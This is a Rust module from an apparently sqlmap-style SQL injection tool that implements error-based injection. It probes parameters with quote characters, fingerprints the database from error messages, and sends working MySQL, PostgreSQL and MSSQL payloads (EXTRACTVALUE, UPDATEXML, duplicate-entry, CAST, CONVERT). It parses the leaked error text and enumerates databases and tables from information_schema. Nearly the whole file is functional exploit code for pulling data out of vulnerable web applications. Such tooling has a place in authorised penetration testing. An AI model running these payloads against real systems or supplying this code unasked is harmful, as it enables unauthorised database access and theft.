//! Error-based SQL injection

use crate::sqli::core::{DBMS, CHAR_START, CHAR_STOP};
use crate::sqli::request::Request;
use anyhow::Result;
use regex::Regex;

/// Error-based injection vector
#[derive(Debug, Clone)]
pub struct ErrorVector {
    pub dbms: DBMS,
    pub prefix: String,
    pub suffix: String,
    pub payload_template: String,
}

/// Best-known error-based extraction template for a fingerprinted DBMS.
/// Non-extractable DBMS get an empty template (detection still reported).
fn template_for(dbms: DBMS) -> String {
    match dbms {
        DBMS::MySQL => "AND EXTRACTVALUE(1,CONCAT(0x7e,({QUERY}),0x7e))".to_string(),
        DBMS::PostgreSQL => "AND 1=CAST(({QUERY}) AS INT)".to_string(),
        DBMS::MSSQL => "AND 1=CONVERT(INT,({QUERY}))".to_string(),
        _ => String::new(),
    }
}

/// Check for error-based SQL injection.
///
/// First runs a heuristic, value-seeded probe and scans the response against the
/// full DBMS error-signature table (29 DBMS, ported from sqlmap) — this confirms
/// error-based injection and fingerprints the backend across far more databases
/// than the handful of hardcoded checks below. The targeted MySQL/PG/MSSQL
/// payloads then follow for extraction-ready vectors.
pub async fn check_error_based(request: &Request<'_>) -> Result<Option<ErrorVector>> {
    // ---- Heuristic signature probe (broad DBMS coverage) ----
    let base = request.original_value();
    let base = if base.trim().is_empty() { "1".to_string() } else { base };
    let heuristic_probes = [
        format!("{base}'"),
        format!("{base}\""),
        format!("{base}')"),
        format!("{base}'\"`"),
    ];
    for probe in &heuristic_probes {
        let page = request.query_page(probe).await?;
        if let Some((name, dbms)) = crate::sqli::errors::detect_dbms_error(&page) {
            tracing::info!("Error-based: matched {} error signature", name);
            return Ok(Some(ErrorVector {
                dbms,
                prefix: format!("{base}'"),
                suffix: "-- -".to_string(),
                payload_template: template_for(dbms),
            }));
        }
    }

    // MySQL error-based payloads
    let mysql_payloads = [
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))-- -",
        "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT VERSION()),0x7e),1)-- -",
        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT VERSION()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ];
    
    for payload in mysql_payloads {
        let page = request.query_page(payload).await?;
        
        // Check for version string in error
        if page.contains("~") || page.contains("XPATH") || page.contains("Duplicate entry") {
            // Try to extract version to confirm
            if let Some(version) = extract_error_result(&page) {
                if version.contains('.') {
                    return Ok(Some(ErrorVector {
                        dbms: DBMS::MySQL,
                        prefix: "1".to_string(),
                        suffix: "-- -".to_string(),
                        payload_template: if payload.contains("EXTRACTVALUE") {
                            "AND EXTRACTVALUE(1,CONCAT(0x7e,({QUERY}),0x7e))".to_string()
                        } else if payload.contains("UPDATEXML") {
                            "AND UPDATEXML(1,CONCAT(0x7e,({QUERY}),0x7e),1)".to_string()
                        } else {
                            "AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({QUERY}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)".to_string()
                        },
                    }));
                }
            }
        }
    }
    
    // PostgreSQL error-based
    let pg_payload = "1 AND 1=CAST((SELECT VERSION()) AS INT)-- -";
    let page = request.query_page(pg_payload).await?;
    
    if page.to_lowercase().contains("postgresql") || page.contains("invalid input syntax") {
        return Ok(Some(ErrorVector {
            dbms: DBMS::PostgreSQL,
            prefix: "1".to_string(),
            suffix: "-- -".to_string(),
            payload_template: "AND 1=CAST(({QUERY}) AS INT)".to_string(),
        }));
    }
    
    // MSSQL error-based
    let mssql_payload = "1 AND 1=CONVERT(INT,(SELECT @@VERSION))-- -";
    let page = request.query_page(mssql_payload).await?;
    
    if page.contains("Microsoft SQL Server") || page.contains("Conversion failed") {
        return Ok(Some(ErrorVector {
            dbms: DBMS::MSSQL,
            prefix: "1".to_string(),
            suffix: "-- -".to_string(),
            payload_template: "AND 1=CONVERT(INT,({QUERY}))".to_string(),
        }));
    }
    
    Ok(None)
}

/// Extract result from error message
fn extract_error_result(page: &str) -> Option<String> {
    // MySQL EXTRACTVALUE/UPDATEXML pattern: ~result~
    if let Some(start) = page.find('~') {
        let after = &page[start + 1..];
        if let Some(end) = after.find('~') {
            return Some(after[..end].to_string());
        }
    }
    
    // MySQL duplicate entry pattern: Duplicate entry 'result1' for key
    let re = Regex::new(r"Duplicate entry '([^']+)'").ok()?;
    if let Some(caps) = re.captures(page) {
        if let Some(m) = caps.get(1) {
            let result = m.as_str();
            // Remove the trailing 1 from FLOOR(RAND(0)*2)
            if result.ends_with('1') || result.ends_with('0') {
                return Some(result[..result.len()-1].to_string());
            }
            return Some(result.to_string());
        }
    }
    
    // PostgreSQL pattern: invalid input syntax for type integer: "result"
    let re = Regex::new(r#"invalid input syntax for[^:]+: "([^"]+)""#).ok()?;
    if let Some(caps) = re.captures(page) {
        if let Some(m) = caps.get(1) {
            return Some(m.as_str().to_string());
        }
    }
    
    // MSSQL pattern: Conversion failed when converting the nvarchar value 'result' to data type int
    let re = Regex::new(r"Conversion failed[^']*'([^']+)'").ok()?;
    if let Some(caps) = re.captures(page) {
        if let Some(m) = caps.get(1) {
            return Some(m.as_str().to_string());
        }
    }
    
    None
}

/// Execute error-based query
pub async fn error_use(
    request: &Request<'_>,
    vector: &ErrorVector,
    query: &str,
) -> Result<Option<String>> {
    let payload_part = vector.payload_template.replace("{QUERY}", query);
    let full_payload = format!("{} {}{}", vector.prefix, payload_part, vector.suffix);
    
    let page = request.query_page(&full_payload).await?;
    
    Ok(extract_error_result(&page))
}

/// Get databases using error-based
pub async fn get_databases_error(request: &Request<'_>, vector: &ErrorVector) -> Result<Vec<String>> {
    let mut databases = Vec::new();
    
    // Get count first
    if let Some(count_str) = error_use(request, vector, "SELECT COUNT(schema_name) FROM information_schema.schemata").await? {
        if let Ok(count) = count_str.parse::<usize>() {
            for i in 0..count {
                let query = format!(
                    "SELECT schema_name FROM information_schema.schemata LIMIT {},1",
                    i
                );
                if let Some(db) = error_use(request, vector, &query).await? {
                    databases.push(db);
                }
            }
        }
    }
    
    Ok(databases)
}

/// Get tables using error-based
pub async fn get_tables_error(
    request: &Request<'_>,
    vector: &ErrorVector,
    database: &str,
) -> Result<Vec<String>> {
    let mut tables = Vec::new();
    
    let count_query = format!(
        "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='{}'",
        database
    );
    
    if let Some(count_str) = error_use(request, vector, &count_query).await? {
        if let Ok(count) = count_str.parse::<usize>() {
            for i in 0..count {
                let query = format!(
                    "SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1",
                    database, i
                );
                if let Some(table) = error_use(request, vector, &query).await? {
                    tables.push(table);
                }
            }
        }
    }
    
    Ok(tables)
}
